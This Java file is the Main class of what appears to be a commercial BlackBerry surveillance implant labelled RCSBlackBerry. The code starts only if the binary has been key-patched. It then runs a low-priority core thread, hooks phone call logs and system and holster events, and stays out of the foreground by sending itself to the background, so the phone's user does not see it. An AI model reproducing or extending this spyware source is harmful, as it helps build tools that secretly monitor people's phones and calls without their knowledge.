//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry
 * File         : Main.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry;

import net.rim.blackberry.api.phone.phonelogs.PhoneLogs;
import net.rim.device.api.system.Alert;
import net.rim.device.api.ui.UiApplication;
import blackberry.config.Cfg;
import blackberry.config.Keys;
import blackberry.crypto.Encryption;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

/**
 * The Class Main.
 */

public class Main extends UiApplication {
    //#ifdef DEBUG
    private final Debug debug;
    //#endif

    AppListener appListener;

    //private boolean foreground;

    /**
     * The main method.
     * 
     * @param args
     *            the arguments
     */
    public static void main(final String[] args) {
        //#ifdef TEST
        System.out.println("Test");
        new MainTest();

        //#else
        mainReal();
        //#endif       

    }

    public static void mainReal() {
        final Keys keys = Encryption.getKeys();
        final boolean binaryPatched = keys.hasBeenBinaryPatched();

        if (binaryPatched) {
            new Main().enterEventDispatcher();
        } else {
            //#ifdef DEBUG
            System.out.println("Not binary patched, bailing out!");
            //#endif
        }
    }

    public static Main getInstance() {
        return (Main) getUiApplication();
    }

    /**
     * Instantiates a new main.
     */
    public Main() {
        final Core core = Core.getInstance();

        Thread.currentThread().setPriority(Thread.MIN_PRIORITY);
        appListener = AppListener.getInstance();

        //#ifdef DEBUG
        debug = new Debug("Main", DebugLevel.VERBOSE);
        debug.info("RCSBlackBerry " + Version.VERSION);
        //#endif

        final Thread coreThread = new Thread(core);
        coreThread.setPriority(Thread.MIN_PRIORITY);
        coreThread.start();

        startListeners();

        if (Keys.getInstance().isDemo()) {
            Status.self().setDemo(true);
        }
        //#ifdef DEBUG
        Status.self().setDebug(true);
        //#endif

        if (Status.self().isDemo()) {
            short[] fire = { 1400, 15, 1350, 15, 1320, 20, 1300, 20, 1250, 25,
                    1200, 35, 1200, 15, 1250, 15, 1300, 20, 1320, 20, 1350, 25,
                    1400, 35 };
            try {
                Alert.startAudio(fire, 100);
            } catch (Exception e) {

            }
        }
    }

    /**
     * 
     */
    public void startListeners() {
        //#ifdef DEBUG
        debug.info("Starting Listeners");
        //#endif

        //Phone.addPhoneListener(appListener);
        addHolsterListener(appListener);
        addSystemListener(appListener);
        //addRadioListener(appListener);
        //MemoryCleanerDaemon.addListener(appListener);

        //addRadioListener(appListener);
        PhoneLogs.addListener(appListener);

        Task.getInstance().resumeApplicationTimer();

        //goBackground();
    }

    /**
     * 
     */
    public void stopListeners() {
        //#ifdef DEBUG
        debug.info("Stopping Listeners");
        //#endif

        removeHolsterListener(appListener);
        removeSystemListener(appListener);
        removeRadioListener(appListener);
        //MemoryCleanerDaemon.removeListener(appListener);

        //Phone.removePhoneListener(appListener);
        PhoneLogs.removeListener(appListener);

        Task.getInstance().suspendApplicationTimer();
        //goBackground();
    }

    public boolean acceptsForeground() {
        return false;
    }

    public void activate() {

    }

    public void deactivate() {

    }

   /* public void showBlackScreen(boolean value) {
        //#ifdef DEBUG
        debug.trace("showBlackScreen: " + value);
        //#endif
        //foreground = value;
        if (value) {
            synchronized (this.getAppEventLock()) {
                BlackScreen.newInstance(Main.getUiApplication());
            }

        } else {
            if (BlackScreen.getInstance() != null) {
                //#ifdef DEBUG
                debug.trace("showBlackScreen: dismiss");
                //#endif
                synchronized (this.getAppEventLock()) {
                    BlackScreen.getInstance().dismiss();
                }

                //goBackground();
            }
        }
    }*/

    public void goBackground() {
        if (!Cfg.IS_UI) {
            return;
        }

        invokeLater(new Runnable() {
            public void run() {

                boolean foreground = false;
                UiApplication.getUiApplication().requestBackground();
                foreground = UiApplication.getUiApplication().isForeground();

                //#ifdef DEBUG
                debug.trace("Main foreground: " + foreground);
                //#endif
            }
        });
    }
}
